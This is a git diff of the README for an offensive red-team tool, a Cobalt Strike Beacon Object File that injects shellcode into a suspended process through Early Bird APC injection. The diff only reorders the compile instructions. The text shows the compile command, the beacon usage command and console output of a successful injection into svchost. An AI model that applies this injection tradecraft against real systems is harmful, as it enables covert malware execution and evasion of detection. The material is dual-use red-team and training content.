@@ -8,11 +8,6 @@
 Beacon Object File (BOF) that spawns an arbitrary process from beacons memory in a suspended state, inject shellcode, hijack main thread with APC, and execute shellcode; using the Early Bird injection method taught by @SEKTOR7net in RED TEAM Operator: Malware Development Intermediate.
 - [Sektor7 RED TEAM Operator: Malware Development Intermediate Course](https://institute.sektor7.net/courses/rto-maldev-intermediate/463257-code-injection/1435343-earlybird)
 
-### Compile with x64 MinGW (only tested from macOS):
-```bash
-x86_64-w64-mingw32-gcc -c hollow.c -o hollow.o
-```
-
 ### Run from Cobalt Strike Beacon Console
 + After compile import the hollow.cna script into Cobalt Strikes Script Manager
 ```bash
@@ -27,6 +22,11 @@ beacon> hollow svchost.exe /Users/bobby.cooke/popCalc.bin
 [+] Success - Wrote 280 bytes to memory in remote process 5464 (PID) at 0x000001A83BEC0000
 [+] Success - APC queued for main thread of 5464 (PID) to shellcode address 0x000001A83BEC0000
 [+] Success - Your thread was resumed and your shellcode is being executed within the remote process!
+```
+
+### Compile with x64 MinGW (only tested from macOS):
+```bash
+x86_64-w64-mingw32-gcc -c hollow.c -o hollow.o
 ```
 
 ### To Do List
